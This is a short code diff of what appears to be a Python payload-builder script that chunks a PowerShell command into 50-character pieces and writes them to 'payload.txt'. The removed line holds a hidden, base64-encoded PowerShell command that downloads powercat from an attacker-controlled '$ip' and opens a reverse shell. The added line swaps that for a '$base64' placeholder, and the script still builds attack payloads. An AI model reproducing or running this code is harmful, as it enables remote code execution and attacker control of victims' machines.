@@ -1,4 +1,4 @@
-str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AJABpAHAALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAiACkAOwBwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAkAGkAcAAgAC0AcAAgACQAcABvAHIAdAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwACgA="
+str = "powershell.exe -nop -w hidden -e $base64"
 n=50
 for i in range(0,len(str),n):
    with open("payload.txt", "a") as f:
